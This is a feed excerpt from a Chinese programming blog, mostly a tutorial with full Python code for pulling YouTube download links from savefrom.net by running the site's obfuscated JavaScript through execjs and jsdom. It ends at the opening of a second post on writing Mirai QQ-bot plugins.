class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;87\&quot;, \&quot;Not;A Brand\&quot;;v=\&quot;99\&quot;,\&quot;Chromium\&quot;;v=\&quot;87\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-dest&quot;</span>: <span class="string">&quot;iframe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-user&quot;</span>: <span class="string">&quot;?1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;upgrade-insecure-requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/87.0.4280.88 Safari/537.36&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># set the parameter, we can get from chrome</span></span><br><span class="line">    kv = &#123;<span class="string">&quot;sf_url&quot;</span>: url,</span><br><span class="line">          <span class="string">&quot;sf_submit&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;new&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">          <span class="string">&quot;lang&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">          <span class="string">&quot;app&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;country&quot;</span>: <span class="string">&quot;cn&quot;</span>,</span><br><span class="line">          <span class="string">&quot;os&quot;</span>: <span class="string">&quot;Windows&quot;</span>,</span><br><span class="line">          <span class="string">&quot;browser&quot;</span>: <span class="string">&quot;Chrome&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># do the POST request</span></span><br><span class="line">    r = requests.post(url=<span class="string">&quot;https://en.savefrom.net/savefrom.php&quot;</span>, headers=headers,</span><br><span class="line">                      data=kv)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="comment"># get the result</span></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br></pre></td></tr></table></figure><h3 id="2-调用解密函数"><a href="#2-调用解密函数" class="headerlink" title="2. 调用解密函数"></a>2. 调用解密函数</h3><h3 id="i-分析"><a href="#i-分析" class="headerlink" title="i. 分析"></a>i. 分析</h3><p>这其中的难点在于在python里执行javascript代码，而晚上的解决方法有<code>PyV8</code>等，本文选用<code>execjs</code>。在思路部分我们可以发现js部分的最后几行是解密函数，所以我们只需要在<code>execjs</code>中先执行一遍全部，然后再单独执行解密函数就好了</p><h3 id="ii-先取出js部分"><a href="#ii-先取出js部分" class="headerlink" title="ii. 先取出js部分"></a>ii. 先取出js部分</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># target(youtube address) url</span></span><br><span class="line">    url = <span class="string">&quot;https://www.youtube.com/watch?v=YPvtz1lHRiw&quot;</span></span><br><span class="line">    <span class="comment"># get the target text</span></span><br><span class="line">    reo = gethtml(url)</span><br><span class="line">    <span class="comment"># Remove the code from the head and tail (we need the javascript part, information store with encryption in js part)</span></span><br><span class="line">    reo = reo.split(<span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/script&gt;&quot;</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>这里其实可以用正则，不过由于笔者正则表达式还不太熟练就直接用<code>split</code>了</p><h3 id="iii-取第一个解密函数作为我们用的解密函数"><a href="#iii-取第一个解密函数作为我们用的解密函数" class="headerlink" title="iii. 取第一个解密函数作为我们用的解密函数"></a>iii. 取第一个解密函数作为我们用的解密函数</h3><p>当你多取几次不同视频的结果，你就会发现每次的解密函数都不一样，不过位置都是还是在固定行数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># split each line(help us find the decrypt function in last few line)</span></span><br><span class="line">    reA = reo.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="comment"># get the depcrypt function</span></span><br><span class="line">    name = reA[<span class="built_in">len</span>(reA) - <span class="number">3</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>] + <span class="string">&quot;;&quot;</span></span><br></pre></td></tr></table></figure><p>所以<code>name</code>就是我们的解密函数了(变量名没取太好hhh)</p><h3 id="iv-用execjs执行"><a href="#iv-用execjs执行" class="headerlink" title="iv. 用execjs执行"></a>iv. 用execjs执行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use execjs to execute the js code, and the cwd is the result of `npm root -g`(the path of npm in your computer)</span></span><br><span class="line">    ct = execjs.<span class="built_in">compile</span>(reo)</span><br><span class="line">    <span class="comment"># do the decryption</span></span><br><span class="line">    text = ct.<span class="built_in">eval</span>(name.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><p>其中只取<code>=</code>后面的和去掉分号是指指执行这个函数而不用赋值，当先执行赋值+解密然后取值也不是不可以<br>但是我们可以发现马上就报错了(要是有这么简单就好了)</p><h4 id="1-this也就是window变量不存在"><a href="#1-this也就是window变量不存在" class="headerlink" title="1. this也就是window变量不存在"></a>1. this也就是window变量不存在</h4><p>如果没记错是报错<code>this</code>或者<code>$b</code>，笔者尝试把全部<code>this</code>去掉或者把全部框在一个<code>class</code>里面(这样子this就变成那个class了)不过都没有成功，然后发现在<code>npm</code>下有个<code>jsdom</code>可以在<code>execjs</code>里模拟window变量(其实应该有更好方法的)，所以我们需要下载<code>npm</code>和里面的<code>jsdom</code>，然后改写以上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">addition = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">const jsdom = require(&quot;jsdom&quot;);</span></span><br><span class="line"><span class="string">const &#123; JSDOM &#125; = jsdom;</span></span><br><span class="line"><span class="string">const dom = new JSDOM(`&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;`);</span></span><br><span class="line"><span class="string">window = dom.window;</span></span><br><span class="line"><span class="string">document = window.document;</span></span><br><span class="line"><span class="string">XMLHttpRequest = window.XMLHttpRequest;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># use execjs to execute the js code, and the cwd is the result of `npm root -g`(the path of npm in your computer)</span></span><br><span class="line">ct = execjs.<span class="built_in">compile</span>(addition + reo, cwd=<span class="string">r&#x27;C:\Users\xxx\AppData\Roaming\npm\node_modules&#x27;</span>)</span><br></pre></td></tr></table></figure><p>其中</p><ul><li><code>cwd</code>字段是<code>npm root -g</code>的结果，也就是npm的modules路径</li><li><code>addition</code>是用来模拟<code>window</code>的<br>但是我们又可以发现下一个错误</li></ul><h4 id="2-alert不存在"><a href="#2-alert不存在" class="headerlink" title="2. alert不存在"></a>2. alert不存在</h4><p>这个错误是因为在<code>execjs</code>下执行<code>alert</code>函数是没有意义的，因为我们没有浏览器让他弹窗，且原本<code>alert</code>函数的定义是来源<code>window</code>而我们自定义了<code>window</code>，所以我们要在代码前重写覆盖<code>alert</code>函数(相当于定义一个alert)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># override the alert function, because in the code there has one place using</span></span><br><span class="line">    <span class="comment"># and we cannot do the alerting in execjs(it is meaningless) however, if we donnot override, the code will raise a error</span></span><br><span class="line">    reo = reo.replace(<span class="string">&quot;(function()&#123;&quot;</span>, <span class="string">&quot;(function()&#123;\nthis.alert=function()&#123;&#125;;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="v-整合代码"><a href="#v-整合代码" class="headerlink" title="v. 整合代码"></a>v. 整合代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># target(youtube address) url</span></span><br><span class="line">    url = <span class="string">&quot;https://www.youtube.com/watch?v=YPvtz1lHRiw&quot;</span></span><br><span class="line">    <span class="comment"># get the target text</span></span><br><span class="line">    reo = gethtml(url)</span><br><span class="line">    <span class="comment"># Remove the code from the head and tail (we need the javascript part, information store with encryption in js part)</span></span><br><span class="line">    reo = reo.split(<span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/script&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># override the alert function, because in the code there has one place using</span></span><br><span class="line">    <span class="comment"># and we cannot do the alerting in execjs(it is meaningless) however, if we donnot override, the code will raise a error</span></span><br><span class="line">    reo = reo.replace(<span class="string">&quot;(function()&#123;&quot;</span>, <span class="string">&quot;(function()&#123;\nthis.alert=function()&#123;&#125;;&quot;</span>)</span><br><span class="line">    <span class="comment"># split each line(help us find the decrypt function in last few line)</span></span><br><span class="line">    reA = reo.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="comment"># get the depcrypt function</span></span><br><span class="line">    name = reA[<span class="built_in">len</span>(reA) - <span class="number">3</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>] + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="comment"># add jsdom into the execjs because the code will use(maybe there is a solution without jsdom, but i have no idea)</span></span><br><span class="line">    addition = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    const jsdom = require(&quot;jsdom&quot;);</span></span><br><span class="line"><span class="string">    const &#123; JSDOM &#125; = jsdom;</span></span><br><span class="line"><span class="string">    const dom = new JSDOM(`&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;`);</span></span><br><span class="line"><span class="string">    window = dom.window;</span></span><br><span class="line"><span class="string">    document = window.document;</span></span><br><span class="line"><span class="string">    XMLHttpRequest = window.XMLHttpRequest;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># use execjs to execute the js code, and the cwd is the result of `npm root -g`(the path of npm in your computer)</span></span><br><span class="line">    ct = execjs.<span class="built_in">compile</span>(addition + reo, cwd=<span class="string">r&#x27;C:\Users\19308\AppData\Roaming\npm\node_modules&#x27;</span>)</span><br><span class="line">    <span class="comment"># do the decryption</span></span><br><span class="line">    text = ct.<span class="built_in">eval</span>(name.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><h3 id="3-分析解密结果"><a href="#3-分析解密结果" class="headerlink" title="3. 分析解密结果"></a>3. 分析解密结果</h3><h4 id="i-取关键json"><a href="#i-取关键json" class="headerlink" title="i. 取关键json"></a>i. 取关键json</h4><p>运行完上面的部分，解密结果就存在text里了，而我们在思路中可以发现，真正对我们重要的就是存在<code>window.parent.sf.videoResult.show()</code>里的json，所以用正则表达式取这一部分的json</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get the result in json</span></span><br><span class="line">    result = re.search(<span class="string">&#x27;show\((.*?)\);;&#x27;</span>, text, re.I | re.M).group(<span class="number">0</span>).replace(<span class="string">&quot;show(&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;);;&quot;</span>, <span class="string">&quot;&quot;</span>)  </span><br></pre></td></tr></table></figure><h4 id="ii-格式化json"><a href="#ii-格式化json" class="headerlink" title="ii. 格式化json"></a>ii. 格式化json</h4><p>python可以格式化json的库有很多，这里笔者用了<code>json</code>库(记得import)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use `json` to load json</span></span><br><span class="line">    j = json.loads(result)</span><br></pre></td></tr></table></figure><h4 id="iii-取下载地址"><a href="#iii-取下载地址" class="headerlink" title="iii. 取下载地址"></a>iii. 取下载地址</h4><p>接下来就到了最后一步，根据思路里和json格式化工具我们可以发现<code>j[&quot;url&quot;][num][&quot;url&quot;]</code>就是下载链接，而<code>num</code>是我们要的视频格式(不同分辨率和类型)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># the selection of video(in this case, num=1 mean the video is</span></span><br><span class="line">    <span class="comment"># - 360p known from j[&quot;url&quot;][num][&quot;quality&quot;]</span></span><br><span class="line">    <span class="comment"># - MP4 known from j[&quot;url&quot;][num][&quot;type&quot;]</span></span><br><span class="line">    <span class="comment"># - audio known from j[&quot;url&quot;][num][&quot;audio&quot;]</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    downurl = j[<span class="string">&quot;url&quot;</span>][num][<span class="string">&quot;url&quot;</span>]</span><br><span class="line">    <span class="comment"># do some download</span></span><br><span class="line">    <span class="comment"># thanks :)</span></span><br><span class="line">    <span class="comment"># - EOF -</span></span><br></pre></td></tr></table></figure><h2 id="3-全部代码"><a href="#3-全部代码" class="headerlink" title="3. 全部代码"></a>3. 全部代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2021/1/10</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: Youtube.py</span></span><br><span class="line"><span class="comment"># @License: MIT</span></span><br><span class="line"><span class="comment"># @Environment:</span></span><br><span class="line"><span class="comment">#           - windows 10</span></span><br><span class="line"><span class="comment">#           - python 3.6.2</span></span><br><span class="line"><span class="comment"># @Dependence:</span></span><br><span class="line"><span class="comment">#           - jsdom in npm(windows also can use)</span></span><br><span class="line"><span class="comment">#           - requests, execjs, re, json in python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethtml</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># set the headers or the website will not return information</span></span><br><span class="line">    <span class="comment"># the cookies in here you may need to change</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&quot;</span></span><br><span class="line">                  <span class="string">&quot;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;lang=en; country=CN; uid=fd94a82a406a8dd4; sfHelperDist=72; reference=14; &quot;</span></span><br><span class="line">                  <span class="string">&quot;clickads-e2=90; poropellerAdsPush-e=63; promoBlock=64; helperWidget=92; &quot;</span></span><br><span class="line">                  <span class="string">&quot;helperBanner=42; framelessHdConverter=68; inpagePush2=68; popupInOutput=9; &quot;</span></span><br><span class="line">                  <span class="string">&quot;_ga=GA1.2.799702638.1610248969; _gid=GA1.2.628904587.1610248969; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSID=030393eb0776d20d0975f99b523a70d4; x-requested-with=; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSUD=islilfjn5alth33j9j8glj9776; _gat_helperWidget=1; _gat_inpagePush2=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://en.savefrom.net&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://en.savefrom.net/1-youtube-video-downloader-4/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;87\&quot;, \&quot;Not;A Brand\&quot;;v=\&quot;99\&quot;,\&quot;Chromium\&quot;;v=\&quot;87\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-dest&quot;</span>: <span class="string">&quot;iframe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-user&quot;</span>: <span class="string">&quot;?1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;upgrade-insecure-requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/87.0.4280.88 Safari/537.36&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># set the parameter, we can get from chrome</span></span><br><span class="line">    kv = &#123;<span class="string">&quot;sf_url&quot;</span>: url,</span><br><span class="line">          <span class="string">&quot;sf_submit&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;new&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">          <span class="string">&quot;lang&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">          <span class="string">&quot;app&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;country&quot;</span>: <span class="string">&quot;cn&quot;</span>,</span><br><span class="line">          <span class="string">&quot;os&quot;</span>: <span class="string">&quot;Windows&quot;</span>,</span><br><span class="line">          <span class="string">&quot;browser&quot;</span>: <span class="string">&quot;Chrome&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># do the POST request</span></span><br><span class="line">    r = requests.post(url=<span class="string">&quot;https://en.savefrom.net/savefrom.php&quot;</span>, headers=headers,</span><br><span class="line">                      data=kv)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="comment"># get the result</span></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># target(youtube address) url</span></span><br><span class="line">    url = <span class="string">&quot;https://www.youtube.com/watch?v=YPvtz1lHRiw&quot;</span></span><br><span class="line">    <span class="comment"># get the target text</span></span><br><span class="line">    reo = gethtml(url)</span><br><span class="line">    <span class="comment"># Remove the code from the head and tail (we need the javascript part, information store with encryption in js part)</span></span><br><span class="line">    reo = reo.split(<span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/script&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># override the alert function, because in the code there has one place using</span></span><br><span class="line">    <span class="comment"># and we cannot do the alerting in execjs(it is meaningless) however, if we donnot override, the code will raise a error</span></span><br><span class="line">    reo = reo.replace(<span class="string">&quot;(function()&#123;&quot;</span>, <span class="string">&quot;(function()&#123;\nthis.alert=function()&#123;&#125;;&quot;</span>)</span><br><span class="line">    <span class="comment"># split each line(help us find the decrypt function in last few line)</span></span><br><span class="line">    reA = reo.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="comment"># get the depcrypt function</span></span><br><span class="line">    name = reA[<span class="built_in">len</span>(reA) - <span class="number">3</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>] + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="comment"># add jsdom into the execjs because the code will use(maybe there is a solution without jsdom, but i have no idea)</span></span><br><span class="line">    addition = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    const jsdom = require(&quot;jsdom&quot;);</span></span><br><span class="line"><span class="string">    const &#123; JSDOM &#125; = jsdom;</span></span><br><span class="line"><span class="string">    const dom = new JSDOM(`&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;`);</span></span><br><span class="line"><span class="string">    window = dom.window;</span></span><br><span class="line"><span class="string">    document = window.document;</span></span><br><span class="line"><span class="string">    XMLHttpRequest = window.XMLHttpRequest;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># use execjs to execute the js code, and the cwd is the result of `npm root -g`(the path of npm in your computer)</span></span><br><span class="line">    ct = execjs.<span class="built_in">compile</span>(addition + reo, cwd=<span class="string">r&#x27;C:\Users\19308\AppData\Roaming\npm\node_modules&#x27;</span>)</span><br><span class="line">    <span class="comment"># do the decryption</span></span><br><span class="line">    text = ct.<span class="built_in">eval</span>(name.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="comment"># get the result in json</span></span><br><span class="line">    result = re.search(<span class="string">&#x27;show\((.*?)\);;&#x27;</span>, text, re.I | re.M).group(<span class="number">0</span>).replace(<span class="string">&quot;show(&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;);;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># use `json` to load json</span></span><br><span class="line">    j = json.loads(result)</span><br><span class="line">    <span class="comment"># the selection of video(in this case, num=1 mean the video is</span></span><br><span class="line">    <span class="comment"># - 360p known from j[&quot;url&quot;][num][&quot;quality&quot;]</span></span><br><span class="line">    <span class="comment"># - MP4 known from j[&quot;url&quot;][num][&quot;type&quot;]</span></span><br><span class="line">    <span class="comment"># - audio known from j[&quot;url&quot;][num][&quot;audio&quot;]</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    downurl = j[<span class="string">&quot;url&quot;</span>][num][<span class="string">&quot;url&quot;</span>]</span><br><span class="line">    <span class="comment"># do some download</span></span><br><span class="line">    <span class="comment"># thanks :)</span></span><br><span class="line">    <span class="comment"># - EOF -</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>总计102行</li><li>开发环境<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Environment:</span></span><br><span class="line"><span class="comment">#           - windows 10</span></span><br><span class="line"><span class="comment">#           - python 3.6.2</span></span><br></pre></td></tr></table></figure></li><li>依赖<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Dependence:</span></span><br><span class="line"><span class="comment">#           - jsdom in npm(windows also can use)</span></span><br><span class="line"><span class="comment">#           - requests, execjs, re, json in python</span></span><br></pre></td></tr></table></figure><center>-end-</center></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Web crawler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用kotlin/java构建一个Mirai插件</title>
      <link href="/2020/12/28/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B/"/>
      <url>/2020/12/28/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>构建mirai的mirai-console插件教程<br>用到的概念有<br><code>mcl</code> - 指mirai-console-loader，mirai-console官方启动器<br><code>mirai</code> - mirai 是一个在全平台下运行，提供 QQ Android 协议支持的高效率机器人库，根据<code>AGPLv3</code>开源</p><h3 id="资料列表"><a href="#资料列表" class="headerlink" title="资料列表"></a>资料列表</h3><p>以下为一些官方资料<br><a href="https://github.com/mamoe/mirai">mirai官方github库</a><br><a href="https://github.com/mamoe/mirai-console">mirai-console官方github库</a><br><a href="https://github.com/iTXTech/mirai-console-loader">mirai-console-loader(mcl)官方启动器官方github库</a><br>这三者的关系可以参考<a href="https://github.com/mamoe/mirai/blob/dev/docs/mirai-ecology.md">这里</a><br><a href="https://github.com/project-mirai/mirai-hello-world">官方实例</a><br><a href="https://mirai.mamoe.net/">mirai官方论坛</a><br><a href="https://github.com/project-mirai/mirai-console-plugin-template">官方demo</a><br><a href="https://docs.mamoe.net/">mirai在线api文档</a></p><p>另，以下是一些资源:<br><a href="https://github.com/Nambers/mirai_plugin_example">笔者整理的mirai-console插件实例包含kt和java)</a></p><h2 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h2><ul><li>MiraiOK已经没用了，用mcl(网址在上面)</li><li>最好用openjdk不过甲骨文的jdk好像也可以(建议用openjdk, 解释在下面)</li><li>根据<a 